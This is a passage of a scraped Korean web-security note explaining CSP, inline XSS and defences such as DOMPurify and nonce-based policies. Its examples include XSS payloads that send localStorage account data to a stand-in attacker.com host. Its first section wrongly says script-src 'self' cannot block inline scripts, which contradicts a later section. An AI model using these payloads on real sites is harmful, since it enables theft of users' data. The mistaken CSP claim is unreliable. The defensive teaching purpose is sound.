트렌드: CSP Level 3 Trusted Types">6. 최신 보안 트렌드: CSP Level 3 Trusted Types</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#trusted-types를-사용한-xss-완화" title="Trusted Types를 사용한 XSS 완화">Trusted Types를 사용한 XSS 완화</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#결론" title="결론">결론</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#csp만으로는-불충분하지만-여전히-중요합니다" title="CSP만으로는 불충분하지만, 여전히 중요합니다">CSP만으로는 불충분하지만, 여전히 중요합니다</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#보안-체크리스트" title="보안 체크리스트">보안 체크리스트</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#필수-구현-사항" title="필수 구현 사항">필수 구현 사항</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#권장-구현-순서" title="권장 구현 순서">권장 구현 순서</a></div></div></div></div></div></div></div></div></div></div></div><div class="ant-divider ant-divider-horizontal" role="separator"></div><footer class="ant-layout-footer" style="padding:0 24px 24px"></footer></main></section></section></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"note":{"id":"fof5x2htn0tr6euz2trv2mu","title":"CSP와 inline으로 삽입된 XSS 스크립트의 관계","desc":"","updated":1760334816501,"created":1760334801389,"custom":{},"fname":"dev.web.security.csp-inlined-xss","type":"note","vault":{"fsPath":"vault"},"contentHash":"479c8c90662483ecff2eb312242f48b7","links":[],"anchors":{"csp와-inline으로-삽입된-xss-스크립트의-관계":{"type":"header","text":"CSP와 inline으로 삽입된 XSS 스크립트의 관계","value":"csp와-inline으로-삽입된-xss-스크립트의-관계","line":8,"column":0,"depth":2},"핵심-질문-inline으로-xss-script를-넣으면-csp은-무용지물-아닌가":{"type":"header","text":"핵심 질문: \"inline으로 XSS script를 넣으면 CSP은 무용지물 아닌가?\"","value":"핵심-질문-inline으로-xss-script를-넣으면-csp은-무용지물-아닌가","line":10,"column":0,"depth":3},"1-인라인-스크립트와-csp의-한계":{"type":"header","text":"1. 인라인 스크립트와 CSP의 한계","value":"1-인라인-스크립트와-csp의-한계","line":14,"column":0,"depth":2},"csp가-막을-수-없는-경우":{"type":"header","text":"CSP가 막을 수 없는 경우","value":"csp가-막을-수-없는-경우","line":16,"column":0,"depth":3},"2-csp가-효과적인-경우":{"type":"header","text":"2. CSP가 효과적인 경우","value":"2-csp가-효과적인-경우","line":33,"column":0,"depth":2},"csp-설정-예시":{"type":"header","text":"CSP 설정 예시","value":"csp-설정-예시","line":37,"column":0,"depth":3},"csp가-차단하는-것들":{"type":"header","text":"CSP가 차단하는 것들","value":"csp가-차단하는-것들","line":46,"column":0,"depth":3},"3-실제-공격-시나리오에서-csp의-역할":{"type":"header","text":"3. 실제 공격 시나리오에서 CSP의 역할","value":"3-실제-공격-시나리오에서-csp의-역할","line":53,"column":0,"depth":2},"csp가-있을-때-차단되는-것들":{"type":"header","text":"CSP가 있을 때 차단되는 것들","value":"csp가-있을-때-차단되는-것들","line":63,"column":0,"depth":3},"4-올바른-방어-전략-defense-in-depth":{"type":"header","text":"4. 올바른 방어 전략: Defense in Depth","value":"4-올바른-방어-전략-defense-in-depth","line":69,"column":0,"depth":2},"1단계-입력-검증-서버-측":{"type":"header","text":"1단계: 입력 검증 (서버 측)","value":"1단계-입력-검증-서버-측","line":73,"column":0,"depth":3},"2단계-출력-시-sanitization":{"type":"header","text":"2단계: 출력 시 Sanitization","value":"2단계-출력-시-sanitization","line":100,"column":0,"depth":3},"3단계-엄격한-csp-설정":{"type":"header","text":"3단계: 엄격한 CSP 설정","value":"3단계-엄격한-csp-설정","line":117,"column":0,"depth":3},"3-1단계-csp-report-only-모드로-테스트":{"type":"header","text":"3-1단계: CSP Report-Only 모드로 테스트","value":"3-1단계-csp-report-only-모드로-테스트","line":140,"column":0,"depth":3},"5-v-html의-위험성과-대안":{"type":"header","text":"5. v-html의 위험성과 대안","value":"5-v-html의-위험성과-대안","line":151,"column":0,"depth":2},"위험한-코드":{"type":"header","text":"위험한 코드","value":"위험한-코드","line":153,"column":0,"depth":3},"안전한-대안":{"type":"header","text":"안전한 대안","value":"안전한-대안","line":159,"column":0,"depth":3},"6-최신-보안-트렌드-csp-level-3-trusted-types":{"type":"header","text":"6. 최신 보안 트렌드: CSP Level 3 Trusted Types","value":"6-최신-보안-트렌드-csp-level-3-trusted-types","line":202,"column":0,"depth":2},"trusted-types를-사용한-xss-완화":{"type":"header","text":"Trusted Types를 사용한 XSS 완화","value":"trusted-types를-사용한-xss-완화","line":204,"column":0,"depth":3},"결론":{"type":"header","text":"결론","value":"결론","line":246,"column":0,"depth":2},"csp만으로는-불충분하지만-여전히-중요합니다":{"type":"header","text":"CSP만으로는 불충분하지만, 여전히 중요합니다","value":"csp만으로는-불충분하지만-여전히-중요합니다","line":248,"column":0,"depth":3},"보안-체크리스트":{"type":"header","text":"보안 체크리스트","value":"보안-체크리스트","line":268,"column":0,"depth":2},"필수-구현-사항":{"type":"header","text":"필수 구현 사항","value":"필수-구현-사항","line":270,"column":0,"depth":3},"권장-구현-순서":{"type":"header","text":"권장 구현 순서","value":"권장-구현-순서","line":285,"column":0,"depth":3}},"children":[],"parent":"fm8vm79bnyq6fq1gu2oq2zr","data":{}},"body":"\u003ch1 id=\"csp와-inline으로-삽입된-xss-스크립트의-관계\"\u003eCSP와 inline으로 삽입된 XSS 스크립트의 관계\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#csp와-inline으로-삽입된-xss-스크립트의-관계\"\u003e\u003c/a\u003e\u003c/h1\u003e\n\u003ch2 id=\"csp와-inline으로-삽입된-xss-스크립트의-관계-1\"\u003eCSP와 inline으로 삽입된 XSS 스크립트의 관계\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#csp와-inline으로-삽입된-xss-스크립트의-관계-1\"\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003ch3 id=\"핵심-질문-inline으로-xss-script를-넣으면-csp은-무용지물-아닌가\"\u003e핵심 질문: \"inline으로 XSS script를 넣으면 CSP은 무용지물 아닌가?\"\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#핵심-질문-inline으로-xss-script를-넣으면-csp은-무용지물-아닌가\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003e답변: \u003cstrong\u003e맞습니다, 부분적으로 무용지물이 될 수 있습니다.\u003c/strong\u003e\u003c/p\u003e\n\u003ch2 id=\"1-인라인-스크립트와-csp의-한계\"\u003e1. 인라인 스크립트와 CSP의 한계\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#1-인라인-스크립트와-csp의-한계\"\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003ch3 id=\"csp가-막을-수-없는-경우\"\u003eCSP가 막을 수 없는 경우\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#csp가-막을-수-없는-경우\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cpre class=\"language-html\"\u003e\u003ccode class=\"language-html\"\u003e\u003cspan class=\"token comment\"\u003e\u0026#x3C;!-- v-html로 직접 삽입된 악성 스크립트 --\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026#x3C;\u003c/span\u003ediv\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003ev-html\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003euserContent\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n  \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026#x3C;\u003c/span\u003escript\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token script\"\u003e\u003cspan class=\"token language-javascript\"\u003e\n    \u003cspan class=\"token comment\"\u003e// 이 스크립트는 이미 DOM에 삽입되어 실행됨\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003efetch\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"https://attacker.com/steal\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n      method\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"POST\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n      body\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token dom variable\"\u003elocalStorage\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token method function property-access\"\u003egetItem\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"accountInfo\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n  \u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026#x3C;/\u003c/span\u003escript\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026#x3C;/\u003c/span\u003ediv\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eCSP가 \u003ccode\u003escript-src 'self'\u003c/code\u003e로 설정되어 있어도, \u003cstrong\u003e이미 DOM에 삽입된 인라인 스크립트\u003c/strong\u003e는 차단되지 않습니다.\u003c/p\u003e\n\u003ch2 id=\"2-csp가-효과적인-경우\"\u003e2. CSP가 효과적인 경우\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#2-csp가-효과적인-경우\"\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e하지만 CSP는 여전히 중요한 방어층입니다:\u003c/p\u003e\n\u003ch3 id=\"csp-설정-예시\"\u003eCSP 설정 예시\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#csp-설정-예시\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cpre class=\"language-javascript\"\u003e\u003ccode class=\"language-javascript\"\u003e\u003cspan class=\"token maybe-class-name\"\u003eContent\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token maybe-class-name\"\u003eSecurity\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token maybe-class-name\"\u003ePolicy\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e\n  \u003cspan class=\"token keyword module\"\u003edefault\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003esrc \u003cspan class=\"token string\"\u003e'self'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  script\u003cspan class=\"token operator\"\u003e-\u003c/span\u003esrc \u003cspan class=\"token string\"\u003e'self'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e// 인라인 스크립트 차단\u003c/span\u003e\n  connect\u003cspan class=\"token operator\"\u003e-\u003c/span\u003esrc \u003cspan class=\"token string\"\u003e'self'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e \u003cspan class=\"token comment\"\u003e// 외부 서버 연결 차단\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"csp가-차단하는-것들\"\u003eCSP가 차단하는 것들\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#csp가-차단하는-것들\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e❌ \u003ccode\u003e\u0026#x3C;script src=\"https://evil.com/malicious.js\"\u003e\u003c/code\u003e - 외부 스크립트 로드\u003c/li\u003e\n\u003cli\u003e❌ \u003ccode\u003eeval()\u003c/code\u003e, \u003ccode\u003eFunction()\u003c/code\u003e 같은 동적 코드 실행\u003c/li\u003e\n\u003cli\u003e❌ \u003ccode\u003efetch('https://attacker.com')\u003c/code\u003e - 외부 서버로 데이터 전송\u003c/li\u003e\n\u003cli\u003e❌ 이벤트 핸들러 속성 (\u003ccode\u003eonclick\u003c/code\u003e, \u003ccode\u003eonerror\u003c/code\u003e 등)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"3-실제-공격-시나리오에서-csp의-역할\"\u003e3. 실제 공격 시나리오에서 CSP의 역할\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#3-실제-공격-시나리오에서-csp의-역할\"\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cpre class=\"language-html\"\u003e\u003ccode class=\"language-html\"\u003e\u003cspan class=\"token comment\"\u003e\u0026#x3C;!-- 공격자가 삽입한 XSS --\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026#x3C;\u003c/span\u003eimg\u003c/span\u003e\n  \u003cspan class=\"token attr-name\"\u003esrc\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003ex\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n  \u003cspan class=\"token special-attr\"\u003e\u003cspan class=\"token attr-name\"\u003eonerror\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003cspan class=\"token value javascript language-javascript\"\u003e\u003cspan class=\"token function\"\u003efetch\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'//attacker.com?c='\u003c/span\u003e\u003cspan class=\"token operator\"\u003e+\u003c/span\u003e\u003cspan class=\"token dom variable\"\u003elocalStorage\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token method function property-access\"\u003egetItem\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'accountInfo'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e/\u003e\u003c/span\u003e\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"csp가-있을-때-차단되는-것들\"\u003eCSP가 있을 때 차단되는 것들\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#csp가-있을-때-차단되는-것들\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eimg-src 'self'\u003c/code\u003e → 외부 이미지 로드 차단\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003econnect-src 'self'\u003c/code\u003e → attacker.com으로 fetch 차단\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003escript-src 'self'\u003c/code\u003e → onerror 인라인 이벤트 핸들러 차단\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"4-올바른-방어-전략-defense-in-depth\"\u003e4. 올바른 방어 전략: Defense in Depth\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#4-올바른-방어-전략-defense-in-depth\"\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e단일 방어 메커니즘에 의존하지 않고 \u003cstrong\u003e다층 방어\u003c/strong\u003e가 필요합니다:\u003c/p\u003e\n\u003ch3 id=\"1단계-입력-검증-서버-측\"\u003e1단계: 입력 검증 (서버 측)\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#1단계-입력-검증-서버-측\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cpre class=\"language-javascript\"\u003e\u003ccode class=\"language-javascript\"\u003e\u003cspan class=\"token comment\"\u003e// 주의: 기본적인 예시 - 실제로는 불완전함\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"token function\"\u003evalidateInput\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token parameter\"\u003econtent\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"token comment\"\u003e// HTML 태그 제거 또는 이스케이프\u003c/span\u003e\n  \u003cspan class=\"token keyword control-flow\"\u003ereturn\u003c/span\u003e content\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token method function property-access\"\u003ereplace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token regex\"\u003e\u003cspan class=\"token regex-delimiter\"\u003e/\u003c/span\u003e\u003cspan class=\"token regex-source language-regex\"\u003e\u0026#x3C;script[^\u003e]*\u003e.*?\u0026#x3C;\\/script\u003e\u003c/span\u003e\u003cspan class=\"token regex-delimiter\"\u003e/\u003c/span\u003e\u003cspan class=\"token regex-flags\"\u003egi\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"token comment\"\u003e// ⚠️ 이 방법은 \u0026#x3C;ScRiPt\u003e, \u0026#x3C;script/src=...\u003e 같은 변형을 막지 못함\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e// OWASP 권장: 전문 라이브러리 사용\u003c/span\u003e\n\u003cspan class=\"token keyword module\"\u003eimport\u003c/span\u003e \u003cspan class=\"token imports\"\u003evalidator\u003c/span\u003e \u003cspan class=\"token keyword module\"\u003efrom\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"validator\"\u003c/span\u003e\n\u003cspan class=\"token keyword module\"\u003eimport\u003c/span\u003e \u003cspan class=\"token imports\"\u003exss\u003c/span\u003e \u003cspan class=\"token keyword module\"\u003efrom\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"xss\"\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"token function\"\u003esecureValidateInput\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token parameter\"\u003econtent\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"token comment\"\u003e// HTML 인코딩\u003c/span\u003e\n  \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e encoded \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e validator\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token method function property-access\"\u003eescape\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003econtent\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"token comment\"\u003e// 또는 XSS 필터링 라이브러리 사용\u003c/span\u003e\n  \u003cspan class=\"token keyword control-flow\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token function\"\u003exss\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003econtent\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e추가 권장사항:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eWAF (Web Application Firewall) 도입 고려\u003c/li\u003e\n\u003cli\u003eOWASP AntiSamy, ESAPI 등 검증된 라이브러리 사용\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"2단계-출력-시-sanitization\"\u003e2단계: 출력 시 Sanitization\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#2단계-출력-시-sanitization\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cpre class=\"language-javascript\"\u003e\u003ccode class=\"language-javascript\"\u003e\u003cspan class=\"token keyword module\"\u003eimport\u003c/span\u003e \u003cspan class=\"token imports\"\u003e\u003cspan class=\"token maybe-class-name\"\u003eDOMPurify\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"token keyword module\"\u003efrom\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"dompurify\"\u003c/span\u003e\n\n\u003cspan class=\"token keyword module\"\u003eexport\u003c/span\u003e \u003cspan class=\"token keyword module\"\u003edefault\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n  computed\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003esafeContent\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"token keyword control-flow\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token maybe-class-name\"\u003eDOMPurify\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token method function property-access\"\u003esanitize\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003ethis\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token property-access\"\u003euserContent\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token constant\"\u003eALLOWED_TAGS\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"b\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"i\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"u\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"p\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"br\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"token constant\"\u003eALLOWED_ATTR\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"3단계-엄격한-csp-설정\"\u003e3단계: 엄격한 CSP 설정\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#3단계-엄격한-csp-설정\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cpre class=\"language-javascript\"\u003e\u003ccode class=\"language-javascript\"\u003e\u003cspan class=\"token comment\"\u003e// Nonce 기반 CSP (동적 콘텐츠에 적합)\u003c/span\u003e\n\u003cspan class=\"token maybe-class-name\"\u003eContent\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token maybe-class-name\"\u003eSecurity\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token maybe-class-name\"\u003ePolicy\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e\n  \u003cspan class=\"token keyword module\"\u003edefault\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003esrc \u003cspan class=\"token string\"\u003e'none'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  script\u003cspan class=\"token operator\"\u003e-\u003c/span\u003esrc \u003cspan class=\"token string\"\u003e'self'\u003c/span\u003e \u003cspan class=\"token string\"\u003e'nonce-random123'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e// 각 요청마다 새로운 nonce 생성\u003c/span\u003e\n  style\u003cspan class=\"token operator\"\u003e-\u003c/span\u003esrc \u003cspan class=\"token string\"\u003e'self'\u003c/span\u003e \u003cspan class=\"token string\"\u003e'unsafe-inline'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  img\u003cspan class=\"token operator\"\u003e-\u003c/span\u003esrc \u003cspan class=\"token string\"\u003e'self'\u003c/span\u003e data\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  connect\u003cspan class=\"token operator\"\u003e-\u003c/span\u003esrc \u003cspan class=\"token string\"\u003e'self'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  frame\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eancestors \u003cspan class=\"token string\"\u003e'none'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e// Hash 기반 CSP (정적 콘텐츠에 적합)\u003c/span\u003e\n\u003cspan class=\"token maybe-class-name\"\u003eContent\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token maybe-class-name\"\u003eSecurity\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token maybe-class-name\"\u003ePolicy\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e\n  script\u003cspan class=\"token operator\"\u003e-\u003c/span\u003esrc \u003cspan class=\"token string\"\u003e'self'\u003c/span\u003e \u003cspan class=\"token string\"\u003e'sha256-B2yPHKaXnvFWtRChIbabYmUBFZdVfKKXHbWtWidDVF8='\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"token comment\"\u003e// 특정 인라인 스크립트의 SHA-256 해시만 허용\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eNonce vs Hash:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eNonce\u003c/strong\u003e: 매 요청마다 서버가 생성하는 랜덤 값. Stored XSS 시 공격자가 nonce를 예측할 수 없어 효과적\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHash\u003c/strong\u003e: 정적 인라인 스크립트의 해시값. 변경되지 않는 코드에 적합\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"3-1단계-csp-report-only-모드로-테스트\"\u003e3-1단계: CSP Report-Only 모드로 테스트\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#3-1단계-csp-report-only-모드로-테스트\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cpre class=\"language-javascript\"\u003e\u003ccode class=\"language-javascript\"\u003e\u003cspan class=\"token comment\"\u003e// 프로덕션 배포 전 테스트\u003c/span\u003e\n\u003cspan class=\"token maybe-class-name\"\u003eContent\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token maybe-class-name\"\u003eSecurity\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token maybe-class-name\"\u003ePolicy\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token 